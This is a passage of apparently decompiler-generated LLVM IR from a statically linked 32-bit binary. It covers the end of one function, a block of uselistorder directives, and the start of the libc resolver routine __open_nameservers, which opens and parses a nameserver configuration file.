  store i32 %v5_8057a7b, i32* %eax.global-to-local, align 4
  %v0_8057a80 = load i32, i32* @esp, align 4
  %v1_8057a80 = inttoptr i32 %v0_8057a80 to i32*
  store i32 ptrtoint (i8** @global_var_80673e0.316 to i32), i32* %v1_8057a80, align 4
  %v2_8057a87 = call i32 @pthread_mutex_lock(i32 %v1_8057a49.pre-phi)
  store i32 %v2_8057a87, i32* %eax.global-to-local, align 4
  %v0_8057a8c = load i32, i32* @esp, align 4
  %v1_8057a8c = add i32 %v0_8057a8c, 56
  %v2_8057a8c = inttoptr i32 %v1_8057a8c to i32*
  %v3_8057a8c = load i32, i32* %v2_8057a8c, align 4
  store i32 %v3_8057a8c, i32* %edx.global-to-local, align 4
  %v1_8057a90 = add i32 %v0_8057a8c, 72
  %v2_8057a90 = inttoptr i32 %v1_8057a90 to i32*
  %v3_8057a90 = load i32, i32* %v2_8057a90, align 4
  store i32 %v3_8057a90, i32* %eax.global-to-local, align 4
  %v1_8057a94 = sext i32 %v3_8057a8c to i64
  store i64 %v1_8057a94, i64* @global_var_80673f8.317, align 8
  %v1_8057a9a = trunc i32 %v3_8057a90 to i16
  store i16 %v1_8057a9a, i16* @global_var_8062a44.318, align 4
  %v1_8057aa0 = inttoptr i32 %v0_8057a8c to i32*
  %v2_8057aa0 = load i32, i32* %v1_8057aa0, align 4
  store i32 %v2_8057aa0, i32* %eax.global-to-local, align 4
  %v3_8057aa0 = add i32 %v0_8057a8c, 4
  %v1_8057aa1 = inttoptr i32 %v3_8057aa0 to i32*
  %v2_8057aa1 = load i32, i32* %v1_8057aa1, align 4
  store i32 %v2_8057aa1, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8057aa1, align 4
  %v0_8057aa4 = load i32, i32* @ebx, align 4
  store i32 %v0_8057aa4, i32* %v1_8057aa0, align 4
  %v4_8057aa5 = call i32 @__pthread_cleanup_pop_restore(i32* %v4_8057a7b, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8057aa5, i32* %eax.global-to-local, align 4
  %v0_8057aaa = load i32, i32* @esp, align 4
  %v1_8057aaa = add i32 %v0_8057aaa, 32
  %v2_8057aaa = inttoptr i32 %v1_8057aaa to i32*
  store i32 -1, i32* %v2_8057aaa, align 4
  br label %dec_label_pc_8057ab2

dec_label_pc_8057ab2:                             ; preds = %dec_label_pc_8057926, %dec_label_pc_8057a68
  %v0_8057ab2 = load i32, i32* @esp, align 4
  %v1_8057ab2 = add i32 %v0_8057ab2, 16
  br label %dec_label_pc_8057ab5

dec_label_pc_8057ab5:                             ; preds = %dec_label_pc_8057a42, %dec_label_pc_8057ab2
  %v0_8057ab5 = phi i32 [ %v0_8057a61, %dec_label_pc_8057a42 ], [ %v1_8057ab2, %dec_label_pc_8057ab2 ]
  %v1_8057ab5 = add i32 %v0_8057ab5, 16
  %v2_8057ab5 = inttoptr i32 %v1_8057ab5 to i32*
  %v3_8057ab5 = load i32, i32* %v2_8057ab5, align 4
  store i32 %v3_8057ab5, i32* %eax.global-to-local, align 4
  %v1_8057ab9 = add i32 %v0_8057ab5, 220
  %v1_8057abf = inttoptr i32 %v1_8057ab9 to i32*
  %v2_8057abf = load i32, i32* %v1_8057abf, align 4
  store i32 %v2_8057abf, i32* @ebx, align 4
  %v3_8057abf = add i32 %v0_8057ab5, 224
  %v1_8057ac0 = inttoptr i32 %v3_8057abf to i32*
  %v2_8057ac0 = load i32, i32* %v1_8057ac0, align 4
  store i32 %v2_8057ac0, i32* @esi, align 4
  %v3_8057ac0 = add i32 %v0_8057ab5, 228
  %v1_8057ac1 = inttoptr i32 %v3_8057ac0 to i32*
  %v2_8057ac1 = load i32, i32* %v1_8057ac1, align 4
  store i32 %v2_8057ac1, i32* @edi, align 4
  %v3_8057ac1 = add i32 %v0_8057ab5, 232
  %v1_8057ac2 = inttoptr i32 %v3_8057ac1 to i32*
  %v2_8057ac2 = load i32, i32* %v1_8057ac2, align 4
  store i32 %v2_8057ac2, i32* @ebp, align 4
  ret i32 %v3_8057ab5

; uselistorder directives
  uselistorder i32 %v0_8057ab5, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8057a8c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8057a61, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8057a42, { 1, 0 }
  uselistorder i32 %v1_8057a49.pre-phi, { 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-192.1, { 1, 0 }
  uselistorder i32 %v0_80579f4.pre, { 1, 0 }
  uselistorder i32 %v5_80579c7, { 1, 0 }
  uselistorder i32 %v3_80579c7, { 2, 0, 1, 3 }
  uselistorder i32 %v1_805798f, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8057958, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8057926, { 1, 0 }
  uselistorder i32 %v3_8057905, { 1, 0, 2 }
  uselistorder i32 %v0_80578f6, { 1, 0 }
  uselistorder i32 %v5_80578ec, { 1, 0 }
  uselistorder i32* %v3_80578ec, { 1, 0 }
  uselistorder i32 %v0_80577c285, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_80578ec, { 2, 1, 0 }
  uselistorder i32 %v5_80578e6, { 1, 0 }
  uselistorder i32 %v1_80578e5, { 2, 1, 0, 3 }
  uselistorder i32 %v1_80578e1, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80578a5, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_805787f, { 1, 0 }
  uselistorder i32 %v1_8057870, { 1, 0 }
  uselistorder i32 %v0_805782f, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_80577d6, { 1, 2, 0 }
  uselistorder i32 %v0_80577d6, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_80577b0, { 1, 0 }
  uselistorder i32 %v1_80577aa, { 2, 1, 0, 3 }
  uselistorder i32 %v0_80577a5, { 1, 2, 0 }
  uselistorder i32 %v5_80577b062, { 1, 0 }
  uselistorder i32 %v5_8057752, { 1, 0 }
  uselistorder i32 %v3_8057752, { 2, 0, 1, 3 }
  uselistorder i32 %v3_805770a, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80576f0, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_80576f0, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_80576cf, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_80576af, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8057655, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_805763a, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_8057623, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80575ab, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8057598, { 3, 0, 1, 2 }
  uselistorder i32 %v1_805755e, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_805753f, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8057523, { 1, 0 }
  uselistorder i32 %v3_8057518, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_8057515, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_80574ba, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_80574b5, { 2, 1, 0, 3 }
  uselistorder i32 %v1_805749e, { 1, 0 }
  uselistorder i32 %v1_805746a, { 3, 2, 1, 0 }
  uselistorder i32 %v0_805745b99, { 2, 1, 0 }
  uselistorder i32 %v3_8057473, { 1, 0, 4, 3, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i16 %v0_805741b, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32 %v15_8057414, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_8057386, { 3, 2, 10, 5, 1, 11, 9, 4, 0, 8, 6, 7, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 94, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 52, 46, 47, 48, 49, 50, 51, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 80, 77, 78, 79, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 95, 96, 97, 98, 99, 100, 101, 102 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 148, { 0, 13, 11, 1, 2, 3, 4, 5, 6, 7, 12, 8, 9, 10 }
  uselistorder i32 68, { 6, 0, 3, 8, 9, 1, 7, 4, 5, 2, 10 }
  uselistorder i32 27, { 1, 2, 0 }
  uselistorder i32 112, { 0, 4, 5, 6, 2, 3, 1 }
  uselistorder i32 88, { 0, 9, 10, 11, 12, 16, 3, 4, 5, 6, 7, 8, 2, 15, 1, 13, 14 }
  uselistorder i32 72, { 7, 8, 9, 5, 10, 4, 3, 2, 6, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 0 }
  uselistorder i32 ()* @__libc_poll, { 0, 2, 1 }
  uselistorder i32 232, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 228, { 1, 0, 6, 2, 3, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 1, 0 }
  uselistorder i32 176, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32)* @inet_addr, { 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1, 3, 7, 5, 4, 6 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32* inttoptr (i32 -1 to i32*), { 4, 5, 0, 1, 2, 3, 6, 7 }
  uselistorder i32 200, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 3, 0, 4, 5, 1, 2 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 2, 4, 0, 1, 5, 3 }
  uselistorder i32 84, { 10, 0, 11, 1, 13, 12, 2, 7, 8, 3, 4, 5, 6, 9 }
  uselistorder i32 -12, { 16, 10, 9, 11, 8, 12, 13, 14, 15, 17, 18, 19, 7, 21, 22, 20, 23, 24, 25, 26, 27, 0, 28, 60, 58, 59, 34, 35, 29, 30, 31, 32, 33, 36, 37, 1, 38, 61, 46, 45, 3, 40, 4, 41, 42, 43, 44, 39, 2, 47, 48, 51, 50, 52, 53, 54, 55, 49, 56, 57, 5, 6 }
  uselistorder i32 -16, { 23, 24, 25, 14, 16, 17, 13, 15, 12, 18, 11, 19, 20, 21, 22, 27, 26, 28, 29, 10, 31, 32, 30, 2, 85, 33, 34, 86, 35, 36, 3, 87, 88, 37, 90, 91, 43, 44, 38, 39, 40, 41, 42, 45, 46, 4, 47, 48, 49, 89, 0, 63, 61, 60, 58, 59, 6, 52, 7, 53, 54, 55, 51, 56, 57, 50, 5, 62, 64, 69, 68, 70, 71, 72, 73, 65, 66, 67, 74, 75, 79, 76, 77, 78, 80, 8, 81, 9, 82, 83, 84, 1 }
  uselistorder i16* @global_var_8062a44.318, { 2, 1, 0 }
  uselistorder i64* @global_var_80673f8.317, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_80673e0.316 to i32), { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 1025, { 2, 3, 4, 0, 1 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8057ab5, { 1, 0 }
  uselistorder label %dec_label_pc_8057ab2, { 1, 0 }
  uselistorder label %dec_label_pc_8057a42, { 1, 0 }
  uselistorder label %dec_label_pc_8057a2c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057a19, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_80579f4.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80579ec, { 1, 0 }
  uselistorder label %dec_label_pc_80579d3, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8057988, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8057926, { 1, 0 }
  uselistorder label %dec_label_pc_80578f6, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_80578ec, { 1, 0 }
  uselistorder label %dec_label_pc_80578e1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80578de, { 1, 0 }
  uselistorder label %dec_label_pc_8057859, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80577a1, { 1, 0 }
  uselistorder label %dec_label_pc_8057623, { 1, 0 }
  uselistorder label %dec_label_pc_80575ec, { 1, 0 }
  uselistorder label %dec_label_pc_805755e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805746a, { 1, 0 }
  uselistorder label %dec_label_pc_8057454, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_8057ac4 = load i32, i32* @ebp, align 4
  %v0_8057ac5 = load i32, i32* @edi, align 4
  %v0_8057ac6 = load i32, i32* @esi, align 4
  store i32 134540701, i32* %stack_var_-216, align 4
  %v3_8057ad3 = ptrtoint i32* %stack_var_-216 to i32
  %v4_8057ae0 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134540701, i32 ptrtoint (i32* @global_var_8062a48.233 to i32))
  %v1_8057aec = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062a48.233 to i32))
  store i32 %v1_8057aec, i32* @eax, align 4
  %v0_8057af4 = load i32, i32* @global_var_8067ac0.234, align 64
  %tmp43 = icmp slt i32 %v0_8057af4, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_8057ceb, label %dec_label_pc_8057b01

dec_label_pc_8057b01:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_805cc3c.321 to i32), i32* %stack_var_-216, align 4
  %v2_8057b0d = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_805cc0a.322 to i32), i32 ptrtoint (i32* @global_var_805cc3c.321 to i32))
  store i32 %v2_8057b0d, i32* @eax, align 4
  store i32 %v2_8057b0d, i32* @ebp, align 4
  %v1_8057b17 = icmp eq i32 %v2_8057b0d, 0
  %v1_8057b19 = icmp eq i1 %v1_8057b17, false
  br i1 %v1_8057b19, label %dec_label_pc_8057cb6.preheader, label %dec_label_pc_8057b1f

dec_label_pc_8057b1f:                             ; preds = %dec_label_pc_8057b01
  store i32 ptrtoint (i32* @global_var_805cc3c.321 to i32), i32* %stack_var_-216, align 4
  %v2_8057b2b = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_805cc1b.323 to i32), i32 ptrtoint (i32* @global_var_805cc3c.321 to i32))
  store i32 %v2_8057b2b, i32* @ebp, align 4
  %v1_8057b35 = icmp eq i32 %v2_8057b2b, 0
  %v1_8057b37 = icmp eq i1 %v1_8057b35, false
  br i1 %v1_8057b37, label %dec_label_pc_8057cb6.preheader, label %dec_label_pc_8057ce0

dec_label_pc_8057cb6.preheader:                   ; preds = %dec_label_pc_8057b01, %dec_label_pc_8057b1f
  %v2_8057cbd = ptrtoint i32* %stack_var_-180 to i32
  %v3_8057bf1 = add i32 %v3_8057ad3, 164
  %v4_8057bdb = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_8057cb6

dec_label_pc_8057b42:                             ; preds = %dec_label_pc_8057b4d
  %v1_8057b42 = add i32 %v0_8057b4257, 1
  store i32 %v1_8057b42, i32* @ebx, align 4
  %v1_8057b43 = inttoptr i32 %v1_8057b42 to i8*
  %v2_8057b43 = load i8, i8* %v1_8057b43, align 1
  %v3_8057b43 = zext i8 %v2_8057b43 to i32
  %v5_8057b43 = and i32 %v6_8057b4360, -256
  %v6_8057b43 = or i32 %v3_8057b43, %v5_8057b43
  store i32 %v6_8057b43, i32* @ecx, align 4
  %v4_8057b45 = icmp eq i8 %v2_8057b43, 0
  br i1 %v4_8057b45, label %dec_label_pc_8057cb6, label %dec_label_pc_8057b4d

dec_label_pc_8057b4d:                             ; preds = %dec_label_pc_8057b4d.lr.ph, %dec_label_pc_8057b42
  %v6_8057b4360 = phi i32 [ %v6_8057b4355, %dec_label_pc_8057b4d.lr.ph ], [ %v6_8057b43, %dec_label_pc_8057b42 ]
  %v2_8057b4359 = phi i8 [ %v2_8057b4352, %dec_label_pc_8057b4d.lr.ph ], [ %v2_8057b43, %dec_label_pc_8057b42 ]
  %v1_8057b4358 = phi i8* [ %v1_8057b4351, %dec_label_pc_8057b4d.lr.ph ], [ %v1_8057b43, %dec_label_pc_8057b42 ]
  %v0_8057b4257 = phi i32 [ %v0_8057b43.pre, %dec_label_pc_8057b4d.lr.ph ], [ %v1_8057b42, %dec_label_pc_8057b42 ]
  %v2_8057b4d = sext i8 %v2_8057b4359 to i32
  store i32 %v2_8057b4d, i32* @edx, align 4
  store i32 %v0_8057b50.pre, i32* @eax, align 4
  %v2_8057b55 = mul nsw i32 %v2_8057b4d, 2
  %v3_8057b55 = add i32 %v0_8057b50.pre, %v2_8057b55
  %v4_8057b55 = inttoptr i32 %v3_8057b55 to i8*
  %v5_8057b55 = load i8, i8* %v4_8057b55, align 1
  %v6_8057b55 = and i8 %v5_8057b55, 32
  %v7_8057b55 = icmp eq i8 %v6_8057b55, 0
  %v1_8057b59 = icmp eq i1 %v7_8057b55, false
  br i1 %v1_8057b59, label %dec_label_pc_8057b42, label %dec_label_pc_8057b5b

dec_label_pc_8057b5b:                             ; preds = %dec_label_pc_8057b4d
  %v10_8057b5b = icmp eq i8 %v2_8057b4359, 10
  br i1 %v10_8057b5b, label %dec_label_pc_8057cb6, label %dec_label_pc_8057b64

dec_label_pc_8057b64:                             ; preds = %dec_label_pc_8057b5b
  %v10_8057b6c = icmp eq i8 %v2_8057b4359, 35
  %v1_8057b6f = icmp eq i1 %v10_8057b6c, false
  br i1 %v1_8057b6f, label %dec_label_pc_8057bc0.preheader, label %dec_label_pc_8057cb6

dec_label_pc_8057bc0.preheader:                   ; preds = %dec_label_pc_8057b64
  %v2_8057bc06 = load i8, i8* %v1_8057b4358, align 1
  %v3_8057bc07 = icmp eq i8 %v2_8057bc06, 0
  br i1 %v3_8057bc07, label %dec_label_pc_8057bcc, label %dec_label_pc_8057bc5

dec_label_pc_8057b76:                             ; preds = %dec_label_pc_8057bc5
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_8057b7a = load i32, i32* @esp, align 4
  %v3_8057b7a = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_8057b7a = add nuw nsw i32 %v3_8057b7a, 152
  %v5_8057b7a = add i32 %v4_8057b7a, %v1_8057b7a
  %v6_8057b7a = inttoptr i32 %v5_8057b7a to i32*
  store i32 %v0_8057b7a, i32* %v6_8057b7a, align 4
  %v0_8057b84.pre = load i32, i32* @ebx, align 4
  %v4_8057b84.pre = load i32, i32* @ecx, align 4
  %v1_8057b8461 = inttoptr i32 %v0_8057b84.pre to i8*
  %v2_8057b8462 = load i8, i8* %v1_8057b8461, align 1
  %v3_8057b8463 = zext i8 %v2_8057b8462 to i32
  %v5_8057b8464 = and i32 %v4_8057b84.pre, -256
  %v6_8057b8465 = or i32 %v3_8057b8463, %v5_8057b8464
  %v4_8057b8666 = icmp eq i8 %v2_8057b8462, 0
  br i1 %v4_8057b8666, label %dec_label_pc_8057ba3.preheader, label %dec_label_pc_8057b8a.lr.ph

dec_label_pc_8057b8a.lr.ph:                       ; preds = %dec_label_pc_8057b76
  %v0_8057b8d.pre = load i32, i32* @global_var_8062a20, align 32
  br label %dec_label_pc_8057b8a

dec_label_pc_8057b83:                             ; preds = %dec_label_pc_8057b98
  %v1_8057b83 = add i32 %v0_8057b8367, 1
  store i32 %v1_8057b83, i32* @ebx, align 4
  %v1_8057b84 = inttoptr i32 %v1_8057b83 to i8*
  %v2_8057b84 = load i8, i8* %v1_8057b84, align 1
  %v3_8057b84 = zext i8 %v2_8057b84 to i32
  %v5_8057b84 = and i32 %v6_8057b8469, -256
  %v6_8057b84 = or i32 %v3_8057b84, %v5_8057b84
  %v4_8057b86 = icmp eq i8 %v2_8057b84, 0
  br i1 %v4_8057b86, label %dec_label_pc_8057ba3.preheader, label %dec_label_pc_8057b8a

dec_label_pc_8057b8a:                             ; preds = %dec_label_pc_8057b8a.lr.ph, %dec_label_pc_8057b83
  %v6_8057b8469 = phi i32 [ %v6_8057b8465, %dec_label_pc_8057b8a.lr.ph ], [ %v6_8057b84, %dec_label_pc_8057b83 ]
  %v2_8057b8468 = phi i8 [ %v2_8057b8462, %dec_label_pc_8057b8a.lr.ph ], [ %v2_8057b84, %dec_label_pc_8057b83 ]
  %v0_8057b8367 = phi i32 [ %v0_8057b84.pre, %dec_label_pc_8057b8a.lr.ph ], [ %v1_8057b83, %dec_label_pc_8057b83 ]
  %v2_8057b8a = sext i8 %v2_8057b8468 to i32
  store i32 %v2_8057b8a, i32* @edx, align 4
  store i32 %v0_8057b8d.pre, i32* @eax, align 4
  %v2_8057b92 = mul nsw i32 %v2_8057b8a, 2
  %v3_8057b92 = add i32 %v0_8057b8d.pre, %v2_8057b92
  %v4_8057b92 = inttoptr i32 %v3_8057b92 to i8*
  %v5_8057b92 = load i8, i8* %v4_8057b92, align 1
  %v6_8057b92 = and i8 %v5_8057b92, 32
  %v7_8057b92 = icmp eq i8 %v6_8057b92, 0
  %v1_8057b96 = icmp eq i1 %v7_8057b92, false
  br i1 %v1_8057b96, label %dec_label_pc_8057ba3.preheader, label %dec_label_pc_8057b98

dec_label_pc_8057b98:                             ; preds = %dec_label_pc_8057b8a
  %v10_8057b98 = icmp eq i8 %v2_8057b8468, 10
  %v1_8057b9b = icmp eq i1 %v10_8057b98, false
  br i1 %v1_8057b9b, label %dec_label_pc_8057b83, label %dec_label_pc_8057ba3.preheader

dec_label_pc_8057ba3.preheader:                   ; preds = %dec_label_pc_8057b98, %dec_label_pc_8057b8a, %dec_label_pc_8057b83, %dec_label_pc_8057b76
  %v0_8057b83.lcssa = phi i32 [ %v0_8057b84.pre, %dec_label_pc_8057b76 ], [ %v1_8057b83, %dec_label_pc_8057b83 ], [ %v0_8057b8367, %dec_label_pc_8057b8a ], [ %v0_8057b8367, %dec_label_pc_8057b98 ]
  %v6_8057b84.lcssa = phi i32 [ %v6_8057b8465, %dec_label_pc_8057b76 ], [ %v6_8057b84, %dec_label_pc_8057b83 ], [ %v6_8057b8469, %dec_label_pc_8057b8a ], [ %v6_8057b8469, %dec_label_pc_8057b98 ]
  %v1_8057ba375 = inttoptr i32 %v0_8057b83.lcssa to i8*
  %v2_8057ba376 = load i8, i8* %v1_8057ba375, align 1
  %v3_8057ba377 = zext i8 %v2_8057ba376 to i32
  %v5_8057ba378 = and i32 %v6_8057b84.lcssa, -256
  %v6_8057ba379 = or i32 %v3_8057ba377, %v5_8057ba378
  store i32 %v6_8057ba379, i32* @ecx, align 4
  %v4_8057ba580 = icmp eq i8 %v2_8057ba376, 0
  br i1 %v4_8057ba580, label %dec_label_pc_8057bbc, label %dec_label_pc_8057ba9

dec_label_pc_8057b9f:                             ; preds = %dec_label_pc_8057bb7, %dec_label_pc_8057ba9
  store i8 0, i8* %v1_8057ba382, align 1
  %v0_8057ba2 = load i32, i32* @ebx, align 4
  %v1_8057ba2 = add i32 %v0_8057ba2, 1
  store i32 %v1_8057ba2, i32* @ebx, align 4
  %v4_8057ba3.pre = load i32, i32* @ecx, align 4
  %v1_8057ba3 = inttoptr i32 %v1_8057ba2 to i8*
  %v2_8057ba3 = load i8, i8* %v1_8057ba3, align 1
  %v3_8057ba3 = zext i8 %v2_8057ba3 to i32
  %v5_8057ba3 = and i32 %v4_8057ba3.pre, -256
  %v6_8057ba3 = or i32 %v3_8057ba3, %v5_8057ba3
  store i32 %v6_8057ba3, i32* @ecx, align 4
  %v4_8057ba5 = icmp eq i8 %v2_8057ba3, 0
  br i1 %v4_8057ba5, label %dec_label_pc_8057bbc, label %dec_label_pc_8057ba9

dec_label_pc_8057ba9:                             ; preds = %dec_label_pc_8057ba3.preheader, %dec_label_pc_8057b9f
  %v2_8057ba383 = phi i8 [ %v2_8057ba3, %dec_label_pc_8057b9f ], [ %v2_8057ba376, %dec_label_pc_8057ba3.preheader ]
  %v1_8057ba382 = phi i8* [ %v1_8057ba3, %dec_label_pc_8057b9f ], [ %v1_8057ba375, %dec_label_pc_8057ba3.preheader ]
  %v0_8057bc081 = phi i32 [ %v1_8057ba2, %dec_label_pc_8057b9f ], [ %v0_8057b83.lcssa, %dec_label_pc_8057ba3.preheader ]
  %v2_8057ba9 = sext i8 %v2_8057ba383 to i32
  store i32 %v2_8057ba9, i32* @edx, align 4
  %v0_8057bac = load i32, i32* @global_var_8062a20, align 32
  store i32 %v0_8057bac, i32* @eax, align 4
  %v2_8057bb1 = mul nsw i32 %v2_8057ba9, 2
  %v3_8057bb1 = add i32 %v0_8057bac, %v2_8057bb1
  %v4_8057bb1 = inttoptr i32 %v3_8057bb1 to i8*
  %v5_8057bb1 = load i8, i8* %v4_8057bb1, align 1
  %v6_8057bb1 = and i8 %v5_8057bb1, 32
  %v7_8057bb1 = icmp eq i8 %v6_8057bb1, 0
  %v1_8057bb5 = icmp eq i1 %v7_8057bb1, false
  br i1 %v1_8057bb5, label %dec_label_pc_8057b9f, label %dec_label_pc_8057bb7

dec_label_pc_8057bb7:                             ; preds = %dec_label_pc_8057ba9
  %v10_8057bb7 = icmp eq i8 %v2_8057ba383, 10
  br i1 %v10_8057bb7, label %dec_label_pc_8057b9f, label %dec_label_pc_8057bbc

dec_label_pc_8057bbc:                             ; preds = %dec_label_pc_8057b9f, %dec_label_pc_8057bb7, %dec_label_pc_8057ba3.preheader
  %v0_8057bc0.lcssa = phi i32 [ %v0_8057b83.lcssa, %dec_label_pc_8057ba3.preheader ], [ %v0_8057bc081, %dec_label_pc_8057bb7 ], [ %v1_8057ba2, %dec_label_pc_8057b9f ]
  %v1_8057ba3.lcssa = phi i8* [ %v1_8057ba375, %dec_label_pc_8057ba3.preheader ], [ %v1_8057ba382, %dec_label_pc_8057bb7 ], [ %v1_8057ba3, %dec_label_pc_8057b9f ]
  %v4_8057bbc = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_8057bc0 = load i8, i8* %v1_8057ba3.lcssa, align 1
  %v3_8057bc0 = icmp eq i8 %v2_8057bc0, 0
  br i1 %v3_8057bc0, label %dec_label_pc_8057bcc, label %dec_label_pc_8057bc5

dec_label_pc_8057bc5:                             ; preds = %dec_label_pc_8057bc0.preheader, %dec_label_pc_8057bbc
  %v0_8057b7a = phi i32 [ %v0_8057bc0.lcssa, %dec_label_pc_8057bbc ], [ %v0_8057b4257, %dec_label_pc_8057bc0.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_8057bbc, %dec_label_pc_8057bbc ], [ 0, %dec_label_pc_8057bc0.preheader ]
  %v7_8057bca = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_8057bca, label %dec_label_pc_8057bcc, label %dec_label_pc_8057b76

dec_label_pc_8057bcc:                             ; preds = %dec_label_pc_8057bbc, %dec_label_pc_8057bc5, %dec_label_pc_8057bc0.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_8057bc0.preheader ], [ %v4_8057bbc, %dec_label_pc_8057bbc ], [ %stack_var_-196.013, %dec_label_pc_8057bc5 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_8057bd3 = load i32, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_805cc33.324 to i32), i32* %stack_var_-216, align 4
  %v5_8057bdb = call i32 @__GI_strcoll(i8* %v4_8057bdb, i32 ptrtoint ([11 x i8]* @global_var_805cc33.324 to i32), i32 %v0_8057bd3, i32 %v0_8057bd3)
  store i32 %v5_8057bdb, i32* @eax, align 4
  store i32 1, i32* @esi, align 4
  %v1_8057be8 = icmp eq i32 %v5_8057bdb, 0
  br i1 %v1_8057be8, label %dec_label_pc_8057c10.preheader, label %dec_label_pc_8057c21

dec_label_pc_8057c10.preheader:                   ; preds = %dec_label_pc_8057bcc
  %v5_8057c1495 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_8057c1495, label %dec_label_pc_8057c16.lr.ph, label %dec_label_pc_8057c21

dec_label_pc_8057c16.lr.ph:                       ; preds = %dec_label_pc_8057c10.preheader
  %v0_8057c16.pre = load i32, i32* @global_var_8067ac0.234, align 64
  br label %dec_label_pc_8057c16

dec_label_pc_8057bee:                             ; preds = %dec_label_pc_8057c16
  %v2_8057bf1 = mul i32 %v1_8057bf196, 4
  %v4_8057bf1 = add i32 %v2_8057bf1, %v3_8057bf1
  %v5_8057bf1 = inttoptr i32 %v4_8057bf1 to i32*
  %v6_8057bf1 = load i32, i32* %v5_8057bf1, align 4
  %v1_8057bf8 = inttoptr i32 %v6_8057bf1 to i8*
  %v2_8057bf8 = call i32 @__GI_strdup(i8* %v1_8057bf8)
